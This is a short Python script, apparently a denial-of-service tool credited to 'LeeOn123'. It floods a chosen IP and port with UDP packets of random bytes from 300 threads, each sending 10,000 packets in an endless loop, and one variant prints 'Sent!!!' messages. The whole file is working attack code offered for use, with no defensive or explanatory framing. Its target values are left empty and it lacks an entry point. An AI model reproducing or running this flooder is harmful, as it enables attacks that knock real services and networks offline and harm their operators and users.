#!/usr/bin/env python3
#Code by LeeOn123
import random
import socket
import threading

ip = ""
port = 0
choice = ""
times = 10000
threads = 300
flag = True
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			if flag == False:
			  return
			print(i +" Sent!!!")
		except:
			print("[!] Error!!!")

def run2():
  data = random._urandom(1024)
  i = random.choice(("[*]","[!]","[#]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      if flag == False:
        return
    except:
      pass


def mainudp():
	for y in range(threads):
		if choice == 'y':
			th = threading.Thread(target = run)
			th.start()
		else:
			th = threading.Thread(target = run2)
			th.start()